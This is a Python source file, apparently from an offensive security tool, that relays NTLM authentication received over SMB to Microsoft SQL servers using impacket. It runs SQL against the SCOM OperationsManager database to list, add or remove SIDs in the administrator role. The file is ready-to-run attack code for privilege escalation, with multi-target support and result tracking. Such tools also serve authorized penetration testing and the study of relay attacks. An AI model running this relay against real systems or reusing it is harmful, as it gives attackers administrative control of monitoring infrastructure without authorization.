import time
import logging
import sys
import io
from threading import Lock, Thread
from contextlib import redirect_stdout, redirect_stderr

from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.ldap import ldaptypes
from impacket.examples import logger as impacket_logger
from impacket.examples.ntlmrelayx.clients import PROTOCOL_CLIENTS
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS

from lib.logger import logger


class RelayResultHandler(logging.Handler):
    def __init__(self, relay_instance):
        super().__init__()
        self.relay = relay_instance
        
    def emit(self, record):
        try:
            msg = self.format(record)
            
            if "Executing SQL:" in msg and "mssql://" in msg:
                for target in self.relay.targets_list:
                    if target in msg:
                        logger.info(f"[+] {target} - Query executing...")
                        break
            
            elif "SUCCEED" in msg and "mssql://" in msg:
                for target in self.relay.targets_list:
                    if target in msg:
                        self.relay.target_results[target] = "SUCCESS"
                        logger.info(f"[+] {target} - Query executed successfully")
                        break
            
            elif ("FAILED" in msg or "ERROR" in msg) and "mssql://" in msg:
                for target in self.relay.targets_list:
                    if target in msg:
                        self.relay.target_results[target] = "FAILED"
                        logger.info(f"[-] {target} - Operation failed")
                        break
                        
        except Exception:
            pass


class MSSQLSCOMRELAY:
    def __init__(self, target: str, target_file: str, sid: str, interface: str, port: int, 
                 timeout: int, operation_mode: str, verbose: bool):
        self.target = target
        self.target_file = target_file
        self.sid = sid
        self.interface = interface
        self.port = port
        self.timeout = timeout
        self.operation_mode = operation_mode
        self.verbose = verbose
        self.attacked_targets = []
        self.target_results = {}  # Track results per target
        self.attack_lock = Lock()
        self.server = None
        self.query = None
        self.targets_list = []

        self.query = self.build_query()

        if self.target_file:
            self.targets_list = self.load_targets_from_file(self.target_file)
            logger.info(f"Loaded {len(self.targets_list)} targets from file")
            logger.info(f"Operation mode: {self.operation_mode}")
        else:
            if not self.target.startswith("mssql://"):
                self.target = f"mssql://{self.target}"
            self.targets_list = [self.target]
            logger.info(f"Targeting MSSQL server at {self.target}")
            logger.info(f"Operation mode: {self.operation_mode}")

        for target in self.targets_list:
            self.target_results[target] = "WAITING"

        if len(self.targets_list) == 1:
            target_processor = TargetsProcessor(
                singleTarget=self.targets_list[0],
                protocolClients=PROTOCOL_CLIENTS
            )
        else:
            import tempfile
            import os
            temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
            for t in self.targets_list:
                temp_file.write(f"{t}\n")
            temp_file.close()
            self.temp_targets_file = temp_file.name
            
            target_processor = TargetsProcessor(
                targetListFile=self.temp_targets_file,
                protocolClients=PROTOCOL_CLIENTS
            )

        config = NTLMRelayxConfig()
        config.setTargets(target_processor)
        config.setProtocolClients(PROTOCOL_CLIENTS)
        config.setAttacks(PROTOCOL_ATTACKS)
        
        if self.verbose:
            logger.info(f"[DEBUG] Registered protocol clients: {list(PROTOCOL_CLIENTS.keys())}")
            logger.info(f"[DEBUG] Registered attacks: {list(PROTOCOL_ATTACKS.keys())}")
        
        config.setMSSQLOptions([self.query])
        if self.verbose:
            logger.info(f"[DEBUG] Set MSSQL query via setMSSQLOptions: {self.query}")
        
        config.setListeningPort(port)
        config.setInterfaceIp(interface)
        config.setSMB2Support(True)
        config.setMode("RELAY")
        config.setOutputFile(None)
        config.setDisableMulti(False)
        config.setKeepRelaying(True)

        self.server = SMBRelayServer(config)
        if self.verbose:
            logger.info("[DEBUG] SMBRelayServer created successfully")

    def load_targets_from_file(self, filepath):
        targets = []
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        if not line.startswith("mssql://"):
                            line = f"mssql://{line}"
                        targets.append(line)
            return targets
        except Exception as e:
            logger.info(f"Error loading targets from file: {str(e)}")
            return []

    def convert_string_sid(self, sid):
        try:
            hexsid = ldaptypes.LDAP_SID()
            hexsid.fromCanonical(sid)
            querysid = ('0x' + ''.join('{:02X}'.format(b) for b in hexsid.getData()))
            logger.info(f'[*] Converted {sid} to {querysid}')
            return querysid
        except Exception as e:
            logger.info(f"Error converting SID: {str(e)}")
            return None

    def build_query(self):
        if self.operation_mode == 'list':
            query = "Use OperationsManager; SELECT * FROM AzMan_Role_SIDMember WHERE RoleID = 1;"
            logger.debug(f"Built list query: {query}")
            return query
        
        if not self.sid:
            logger.info("Error: SID is required for insert/delete operations")
            return None

        if self.sid.startswith("0x"):
            hex_sid = self.sid
            logger.info(f"[*] Using provided hex SID: {hex_sid}")
        else:
            hex_sid = self.convert_string_sid(self.sid)
            if not hex_sid:
                return None

        if self.operation_mode == 'delete':
            query = f"Use OperationsManager; DELETE FROM AzMan_Role_SIDMember WHERE RoleID = '1' AND MemberSID = {hex_sid};"
        else:
            query = f"Use OperationsManager; INSERT INTO AzMan_Role_SIDMember (RoleID, MemberSID) Values ('1', {hex_sid});"
        
        logger.debug(f"Built query: {query}")
        return query

    def start(self):
        if not self.query:
            logger.info("Error: Failed to build SQL query. Exiting.")
            return

        impacket_logger.init(ts=False, debug=self.verbose)
        
        if len(self.targets_list) > 1:
            result_handler = RelayResultHandler(self)
            logging.getLogger().addHandler(result_handler)
        
        logger.info(f"Listening on {self.interface}:{self.port}")
        logger.info("Waiting for incoming connections...")
        
        if self.operation_mode == 'list':
            logger.info("[*] Relay will list SCOM admin role members when authentication is received")
        elif self.operation_mode == 'delete':
            logger.info("[*] Relay will remove SID from SCOM admin role when authentication is received")
        else:
            logger.info("[*] Relay will add SID to SCOM admin role when authentication is received")

        try:
            if self.verbose:
                logger.info("[DEBUG] About to call self.server.start()...")
            self.server.start()
            if self.verbose:
                logger.info("[DEBUG] self.server.start() completed")
        except Exception as e:
            logger.info(f"[ERROR] Exception starting server: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")
            return

        if self.verbose:
            logger.info("[DEBUG] Entering main loop...")
        try:
            while True:
                time.sleep(0.1)
        except KeyboardInterrupt:
            logger.info("Keyboard interrupt, exiting...")
            self.shutdown()
        except Exception as e:
            logger.info(f"[ERROR] Exception in main loop: {e}")
            import traceback
            logger.info(f"[ERROR] Traceback:\n{traceback.format_exc()}")

    def print_summary(self):
        if len(self.targets_list) <= 1:
            return
        
        successful = [t for t, status in self.target_results.items() if status == "SUCCESS"]
        
        if successful:
            for target in successful:
                logger.info(f"[*] Successful execution on: {target}")

    def shutdown(self):
        # Clean up temp file if it exists
        if hasattr(self, 'temp_targets_file'):
            try:
                import os
                os.unlink(self.temp_targets_file)
            except:
                pass
        
        # Print summary for multi-target mode
        self.print_summary()
        
        logger.info("Job done...")
        exit()
